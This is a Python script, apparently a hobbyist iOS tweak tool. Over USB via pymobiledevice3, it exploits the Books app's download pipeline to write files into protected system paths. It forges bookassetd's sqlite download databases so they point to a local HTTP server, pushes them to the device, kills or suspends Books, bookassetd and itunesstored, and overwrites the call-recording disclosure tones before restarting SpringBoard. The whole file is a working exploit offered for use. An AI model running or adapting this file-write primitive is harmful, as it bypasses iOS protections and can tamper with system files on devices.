import sys
import os
import shutil
import time
import socket
import sqlite3
import functools
import threading
import subprocess
import asyncio
import queue
import posixpath
import atexit
from http.server import HTTPServer, SimpleHTTPRequestHandler
from packaging.version import parse as parse_version

# --- KIỂM TRA THƯ VIỆN ---
try:
    from pymobiledevice3 import usbmux
    from pymobiledevice3.lockdown import create_using_usbmux
    from pymobiledevice3.services.os_trace import OsTraceService
    from pymobiledevice3.services.afc import AfcService
    from pymobiledevice3.services.dvt.instruments.process_control import ProcessControl
    from pymobiledevice3.services.dvt.dvt_secure_socket_proxy import DvtSecureSocketProxyService
    from pymobiledevice3.remote.remote_service_discovery import RemoteServiceDiscoveryService
    from pymobiledevice3.exceptions import NoDeviceConnectedError
except ImportError as e:
    print(f"[Err] Missing lib: {e}", flush=True)
    print("Run: pip install pymobiledevice3", flush=True)
    sys.exit(1)

# --- CẤU HÌNH ---
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOCAL_SOUNDS_DIR = os.path.join(SCRIPT_DIR, "Sounds")
UUID_FILE = os.path.join(SCRIPT_DIR, "uuid.txt")

TARGET_DISCLOSURE_PATH = "" 
sd_file = "" 
RESPRING_ENABLED = False

audio_head_ok = threading.Event()
audio_get_ok = threading.Event()
info_queue = queue.Queue()

# --- SERVER ---
class AudioRequestHandler(SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'): 
        try:
            code_int = int(code)
        except:
            code_int = 0
        target_file = os.path.basename(sd_file)
        if code_int == 200 and self.path == "/" + target_file:
            if self.command == "HEAD":
                audio_head_ok.set()
            elif self.command == "GET":
                audio_get_ok.set()

def get_lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try: s.connect(("8.8.8.8", 80)); return s.getsockname()[0]
    except: return "127.0.0.1"
    finally: s.close()

def start_http_server():
    try:
        handler = functools.partial(AudioRequestHandler)
        httpd = HTTPServer(("0.0.0.0", 0), handler)
        info_queue.put((get_lan_ip(), httpd.server_port))
        httpd.serve_forever()
    except Exception as e:
        print(f"[Err] Server Error: {e}", flush=True)

# --- AUTO DETECT UDID ---
def get_default_udid() -> str:
    try:
        devices = list(usbmux.list_devices())
    except Exception as e:
        raise RuntimeError(f"Device list error: {e}")

    if not devices:
        raise NoDeviceConnectedError("No device found. Check cable & Trust.")

    usb_devices = [d for d in devices if getattr(d, "is_usb", False) or str(getattr(d, "connection_type", "")).upper() == "USB"]
    if not usb_devices:
        usb_devices = devices

    udid = usb_devices[0].serial
    print(f"[*] Auto-detected Device: {udid}", flush=True)
    return udid

# --- UUID LOGIC ---
def wait_for_uuid_logic(service_provider):
    print("[*] Searching for UUID...", flush=True)
    print(" -> Please open BOOKS app and open/download a book.", flush=True)
    
    found_uuid = None
    start_time = time.time()
    
    try:
        for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
            if time.time() - start_time > 120: 
                print("[!] UUID Timeout.", flush=True)
                break
            
            if posixpath.basename(syslog_entry.filename) == 'bookassetd':
                message = syslog_entry.message
                if "/var/containers/Shared/SystemGroup/" in message:
                    try:
                        uuid_part = message.split("/var/containers/Shared/SystemGroup/")[1].split("/")[0]
                        if len(uuid_part) >= 10 and not uuid_part.startswith("systemgroup.com.apple"):
                            found_uuid = uuid_part
                            break
                    except: continue
                if "/Documents/BLDownloads/" in message:
                    try:
                        uuid_part = message.split("/var/containers/Shared/SystemGroup/")[1].split("/Documents/BLDownloads")[0]
                        if len(uuid_part) >= 10:
                            found_uuid = uuid_part
                            break
                    except: continue
    except: pass
    return found_uuid

# --- MAIN LOGIC ---
def main_callback(service_provider, dvt, uuid):
    global audio_head_ok, audio_get_ok
    audio_head_ok.clear()
    audio_get_ok.clear()

    t = threading.Thread(target=start_http_server, daemon=True)
    t.start()
    try:
        ip, port = info_queue.get(timeout=5)
    except:
        print("[Err] Cannot start server.", flush=True)
        return False

    filename_only = os.path.basename(sd_file)
    audio_url = f"http://{ip}:{port}/{filename_only}"
    print(f"[*] Server: {audio_url}", flush=True)

    FILE_BL_TEMP = "working_BL.sqlite"
    FILE_DL_TEMP = "working_DL.sqlitedb"
    
    if not os.path.exists("BLDatabaseManager.sqlite"):
        with sqlite3.connect("BLDatabaseManager.sqlite") as conn:
            conn.execute("CREATE TABLE IF NOT EXISTS ZBLDOWNLOADINFO (ZASSETPATH VARCHAR, ZPLISTPATH VARCHAR, ZDOWNLOADID VARCHAR, ZURL VARCHAR)")
            conn.execute("INSERT INTO ZBLDOWNLOADINFO VALUES ('','','','')")

    if not os.path.exists("downloads.28.sqlitedb"):
        with sqlite3.connect("downloads.28.sqlitedb") as conn:
             conn.execute("CREATE TABLE IF NOT EXISTS asset (local_path VARCHAR, url VARCHAR)")
             conn.execute("INSERT INTO asset VALUES ('/private/var/containers/Shared/SystemGroup/UUID/Documents/BLDatabaseManager/BLDatabaseManager.sqlite', 'http://url')")

    shutil.copy("BLDatabaseManager.sqlite", FILE_BL_TEMP)
    shutil.copy("downloads.28.sqlitedb", FILE_DL_TEMP)

    try:
        with sqlite3.connect(FILE_BL_TEMP) as bldb_conn:
            c = bldb_conn.cursor()
            c.execute("UPDATE ZBLDOWNLOADINFO SET ZASSETPATH=?, ZPLISTPATH=?, ZDOWNLOADID=?", (TARGET_DISCLOSURE_PATH, TARGET_DISCLOSURE_PATH, TARGET_DISCLOSURE_PATH))
            c.execute("UPDATE ZBLDOWNLOADINFO SET ZURL=?", (audio_url,))
            bldb_conn.commit()
    except Exception as e: print(f"[Err] DB BL: {e}")

    try:
        with sqlite3.connect(FILE_DL_TEMP) as conn:
            c = conn.cursor()
            local_p = f"/private/var/containers/Shared/SystemGroup/{uuid}/Documents/BLDatabaseManager/BLDatabaseManager.sqlite"
            server_p = f"http://{ip}:{port}/{FILE_BL_TEMP}" 
            
            c.execute(f"UPDATE asset SET local_path = '{local_p}' WHERE local_path LIKE '%/BLDatabaseManager.sqlite'")
            c.execute(f"UPDATE asset SET local_path = '{local_p}-shm' WHERE local_path LIKE '%/BLDatabaseManager.sqlite-shm'")
            c.execute(f"UPDATE asset SET local_path = '{local_p}-wal' WHERE local_path LIKE '%/BLDatabaseManager.sqlite-wal'")
            
            c.execute(f"UPDATE asset SET url = '{server_p}' WHERE url LIKE '%/BLDatabaseManager.sqlite'")
            c.execute(f"UPDATE asset SET url = '{server_p}-shm' WHERE url LIKE '%/BLDatabaseManager.sqlite-shm'")
            c.execute(f"UPDATE asset SET url = '{server_p}-wal' WHERE url LIKE '%/BLDatabaseManager.sqlite-wal'")
            conn.commit()
    except Exception as e: print(f"[Err] DB DL: {e}")

    afc = AfcService(lockdown=service_provider)
    pc = ProcessControl(dvt)

    procs = OsTraceService(lockdown=service_provider).get_pid_list().get("Payload", {})
    pid_book = next((pid for pid, p in procs.items() if p['ProcessName'] == 'bookassetd'), None)
    pid_books = next((pid for pid, p in procs.items() if p['ProcessName'] == 'Books'), None)
    
    if pid_book: 
        try: pc.signal(pid_book, 19)
        except: pass
    if pid_books: 
        try: pc.kill(pid_books)
        except: pass

    print(f"[*] Uploading...", flush=True)
    try:
        AfcService(lockdown=service_provider).push(sd_file, filename_only)
        afc.push(FILE_DL_TEMP, "Downloads/downloads.28.sqlitedb")
        afc.push(f"{FILE_DL_TEMP}-shm", "Downloads/downloads.28.sqlitedb-shm")
        afc.push(f"{FILE_DL_TEMP}-wal", "Downloads/downloads.28.sqlitedb-wal")
    except Exception as e:
        print(f"[Warn] Upload fail: {e}", flush=True)

    pid_itunes = next((pid for pid, p in procs.items() if p['ProcessName'] == 'itunesstored'), None)
    if pid_itunes: 
        try: pc.kill(pid_itunes)
        except: pass

    time.sleep(3)
    
    pid_book = next((pid for pid, p in procs.items() if p['ProcessName'] == 'bookassetd'), None)
    pid_books = next((pid for pid, p in procs.items() if p['ProcessName'] == 'Books'), None)
    if pid_book: 
        try: pc.kill(pid_book)
        except: pass
    if pid_books: 
        try: pc.kill(pid_books)
        except: pass

    try: pc.launch("com.apple.iBooks")
    except: pass

    print("[*] Waiting for device...", flush=True)
    start = time.time()
    success = False
    while True:
        if audio_get_ok.is_set():
            print("[OK] Success!", flush=True)
            success = True
            break
        if time.time() - start > 45:
            print("[!] Timeout.", flush=True)
            success = False
            break
        time.sleep(0.1)

    try:
        if AfcService(lockdown=service_provider).exists(filename_only):
            AfcService(lockdown=service_provider).remove(filename_only)
    except: pass

    # --- FIX RESPRING ---
    if RESPRING_ENABLED and success:
        print("[*] Respringing...", flush=True)
        try:
            # Lấy danh sách PID mới nhất
            current_procs = OsTraceService(lockdown=service_provider).get_pid_list().get("Payload", {})
            sb_pid = next((pid for pid, p in current_procs.items() if p['ProcessName'] == 'SpringBoard'), None)
            bb_pid = next((pid for pid, p in current_procs.items() if p['ProcessName'] == 'backboardd'), None)
            
            if sb_pid:
                print(f" -> Killing SpringBoard (pid={sb_pid})...", flush=True)
                pc.kill(sb_pid)
            elif bb_pid:
                print(f" -> Killing backboardd (pid={bb_pid})...", flush=True)
                pc.kill(bb_pid)
            else:
                print("[!] Could not find SpringBoard to kill.", flush=True)
        except Exception as e:
            print(f"[!] Respring failed: {e}", flush=True)
    
    for f in [FILE_BL_TEMP, FILE_DL_TEMP, f"{FILE_DL_TEMP}-shm", f"{FILE_DL_TEMP}-wal"]:
        if os.path.exists(f): 
            try: os.remove(f)
            except: pass
            
    return success

# --- TUNNEL & CONNECTION ---
def exit_tunnel(process):
    try: process.terminate()
    except: pass

async def create_tunnel(udid):
    cmd = [sys.executable, "-m", "pymobiledevice3", "lockdown", "start-tunnel", "--script-mode", "--udid", udid]
    
    print("[*] Creating Tunnel (iOS 17+)...", flush=True)
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    atexit.register(exit_tunnel, process)
    
    while True:
        line = process.stdout.readline()
        if line: 
            decoded = line.decode().strip()
            parts = decoded.split()
            if len(parts) >= 2:
                return {"address": parts[0], "port": int(parts[1])}
        if process.poll() is not None:
            break
    return None

async def _run_async_rsd(address, port, uuid):
    max_retries = 3
    for i in range(max_retries):
        try:
            await asyncio.sleep(2) 
            async with RemoteServiceDiscoveryService((address, port)) as rsd:
                loop = asyncio.get_running_loop()
                result = await loop.run_in_executor(None, lambda: run_blocking(rsd, uuid))
                return result
        except Exception as e:
            print(f"[Retry {i+1}/{max_retries}] Connect failed: {e}", flush=True)
    return False

def run_blocking(rsd, uuid):
    with DvtSecureSocketProxyService(rsd) as dvt: 
        return main_callback(rsd, dvt, uuid)

async def connection_context(udid):
    try:
        sp = create_using_usbmux(serial=udid)
        ver = parse_version(sp.product_version)
    except Exception as e:
        print(f"[Err] Device connect error: {e}")
        return False
    
    uuid = ""
    if os.path.exists(UUID_FILE):
        try:
            content = open(UUID_FILE).read().strip()
            if len(content) > 10: uuid = content
        except: pass

    if not uuid:
        uuid = wait_for_uuid_logic(sp)
        if uuid:
            with open(UUID_FILE, "w") as f: f.write(uuid)
            print(f"[*] UUID saved: {uuid}", flush=True)
        else:
            print("[Error] UUID not found.", flush=True)
            return False

    if ver >= parse_version('17.0'):
        addr = await create_tunnel(udid)
        if addr:
            print(f"[*] Tunnel Info: {addr['address']}:{addr['port']}")
            return await _run_async_rsd(addr["address"], addr["port"], uuid)
        else:
            print("[Error] Tunnel creation failed.", flush=True)
            return False
    else:
        with DvtSecureSocketProxyService(lockdown=sp) as dvt: 
            return main_callback(sp, dvt, uuid)

# --- MAIN ENTRY ---
if __name__ == "__main__":
    os.chdir(SCRIPT_DIR)
    
    if os.name == 'nt':
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("--------------------------------------------------")
                print("[Warning] Please Run as Administrator for best results!")
                print("--------------------------------------------------")
        except: pass

    try:
        udid = get_default_udid()
    except Exception as e:
        print(f"[Error] {e}", flush=True)
        sys.exit(1)

    if not os.path.exists(LOCAL_SOUNDS_DIR):
        print(f"[Error] Sounds folder not found: {LOCAL_SOUNDS_DIR}", flush=True)
        sys.exit(1)

    tasks = [
        {
            "filename": "StartDisclosureWithTone.m4a",
            "target": "/var/mobile/Library/CallServices/Greetings/default/StartDisclosureWithTone.m4a",
            "respring": False
        },
        {
            "filename": "StopDisclosure.caf",
            "target": "/var/mobile/Library/CallServices/Greetings/default/StopDisclosure.caf",
            "respring": True
        }
    ]

    for task in tasks:
        fname = task["filename"]
        source_path = os.path.join(LOCAL_SOUNDS_DIR, fname)
        
        if not os.path.exists(source_path):
            print(f"[Skip] File not found: {source_path}", flush=True)
            continue
        
        temp_path = os.path.join(SCRIPT_DIR, fname)
        try:
            shutil.copy(source_path, temp_path)
            
            sd_file = temp_path
            TARGET_DISCLOSURE_PATH = task["target"]
            RESPRING_ENABLED = task["respring"]
            
            # Retry Loop
            max_task_retries = 3
            task_success = False
            for i in range(max_task_retries):
                print(f"\n=== Processing: {fname} (Attempt {i+1}/{max_task_retries}) ===", flush=True)
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    result = loop.run_until_complete(connection_context(udid))
                    loop.close()
                    if result:
                        task_success = True
                        break
                    else:
                        print("[!] Failed. Retrying...", flush=True)
                        time.sleep(2)
                except Exception as e:
                    print(f"[Err] Error: {e}", flush=True)
            
            if not task_success:
                print(f"[Fail] Could not replace {fname}.", flush=True)

        finally:
            if os.path.exists(temp_path):
                try: os.remove(temp_path)
                except: pass

    print("\n[Done] YangJiii - @duongduong0908", flush=True)